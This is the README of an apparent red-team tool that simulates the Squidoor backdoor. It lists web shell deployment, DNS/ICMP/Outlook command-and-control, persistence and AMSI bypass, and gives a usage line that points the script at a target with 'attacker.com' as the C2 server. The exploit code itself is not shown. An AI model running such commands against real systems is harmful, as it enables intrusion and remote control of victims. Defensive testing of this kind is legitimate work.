# Squidoor Simulator

A comprehensive Bash script that simulates advanced adversary behaviors inspired by the Squidoor backdoor, as documented by Unit 42. This tool is designed for penetration testing, red teaming, and validating cyber defense mechanisms.

## Features

- **Initial Access**
  - IIS vulnerability exploitation
  - Web shell deployment (ASPX)
  - Multiple persistence mechanisms

- **Command and Control**
  - Outlook API communication
  - DNS tunneling
  - ICMP tunneling
  - Encrypted communication channels

- **Persistence Mechanisms**
  - Registry modifications
  - Scheduled tasks
  - WMI event subscriptions

- **Evasion Techniques**
  - AMSI bypass
  - Payload obfuscation
  - Encrypted communication

## Requirements

- Bash 5.0 or higher
- Root privileges (recommended)
- Required tools:
  - dnscat2
  - icmpsh
  - impacket
  - metasploit-framework
  - yq

## Installation

1. Clone the repository:
```bash
git clone https://github.com/yourusername/squidoor-simulator.git
cd squidoor-simulator
```

2. Make the script executable:
```bash
chmod +x squidoor_simulator.sh
```

3. Install dependencies:
```bash
# The script will automatically check and prompt to install missing dependencies
./squidoor_simulator.sh -h
```

## Usage

Basic usage:
```bash
./squidoor_simulator.sh -t <target> -c <c2-server> -p <protocol>
```

Options:
- `-t, --target`: Target IP address or hostname
- `-c, --c2-server`: Command and Control server address
- `-p, --protocol`: C2 protocol (outlook|dns|icmp)
- `-h, --help`: Show help message

Example:
```bash
./squidoor_simulator.sh -t 192.168.1.100 -c attacker.com -p outlook
```

## Configuration

The script uses a YAML configuration file (`config.yaml`) for detailed settings. A default configuration will be created if none exists.

Configuration options include:
- Target settings
- C2 server details
- Web shell configuration
- Persistence mechanisms
- Evasion techniques

## Output

The script generates:
- Detailed logs in `squidoor.log`
- Simulation report in `squidoor_report_[timestamp].txt`
- Temporary files in `/tmp/squidoor/`

## Security Notice

This tool is for educational and testing purposes only. Use only on systems you own or have explicit permission to test. Unauthorized use may be illegal.

## License

MIT License - See LICENSE file for details

## Acknowledgments

- Unit 42 for their analysis of the Squidoor backdoor
- The security research community for their contributions to understanding advanced adversary behaviors 